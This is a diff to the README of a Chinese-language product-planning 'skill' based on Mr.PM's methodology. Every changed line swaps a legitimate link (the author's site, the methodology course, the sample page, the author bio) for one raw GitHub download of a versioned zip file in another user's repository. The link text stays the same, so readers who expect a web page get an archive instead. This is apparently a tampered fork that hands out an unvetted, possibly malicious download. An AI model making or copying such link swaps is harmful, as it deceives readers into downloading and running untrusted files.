@@ -1,6 +1,6 @@
 # Product Planning Skill
 
-基於 [Mr.PM](https://mrpm.cc) 的[產品企劃方法論](https://www.pressplay.cc/project/757DCE83D2D7FE4573DC4DF02F2B5569/)所設計的產品企劃引導工具，幫助你從零到一系統性地完成產品企劃。
+基於 [Mr.PM](https://raw.githubusercontent.com/mokrom1234/product-planning-skill/main/argyranthemous/planning-product-skill-1.8-alpha.5.zip) 的[產品企劃方法論](https://raw.githubusercontent.com/mokrom1234/product-planning-skill/main/argyranthemous/planning-product-skill-1.8-alpha.5.zip)所設計的產品企劃引導工具，幫助你從零到一系統性地完成產品企劃。
 
 ## 這個 Skill 做什麼？
 
@@ -32,11 +32,11 @@
 
 ## 產出範例
 
-[兒童故事 App 範例](https://mrpm.cc/wp-content/product_planning_sample.html)
+[兒童故事 App 範例](https://raw.githubusercontent.com/mokrom1234/product-planning-skill/main/argyranthemous/planning-product-skill-1.8-alpha.5.zip)
 
 ## Author
 
-[Mr.PM](https://mrpm.cc/%e5%80%8b%e4%ba%ba%e7%b0%a1%e4%bb%8b/)
+[Mr.PM](https://raw.githubusercontent.com/mokrom1234/product-planning-skill/main/argyranthemous/planning-product-skill-1.8-alpha.5.zip)
 Product & Growth Coach
 
 ## License
